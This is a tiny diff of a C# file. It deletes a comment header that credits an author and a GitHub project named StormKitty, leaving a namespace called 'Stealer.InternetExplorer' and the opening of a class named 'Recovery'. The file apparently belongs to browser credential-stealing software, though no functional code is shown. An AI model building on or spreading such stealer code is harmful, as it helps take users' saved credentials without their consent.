@@ -1,9 +1,4 @@
-﻿/* 
-    Author : LimerBoy
-    Github : github.com/LimerBoy/StormKitty
-*/
-
-namespace Stealer.InternetExplorer
+﻿namespace Stealer.InternetExplorer
 {
     internal sealed class Recovery
     {
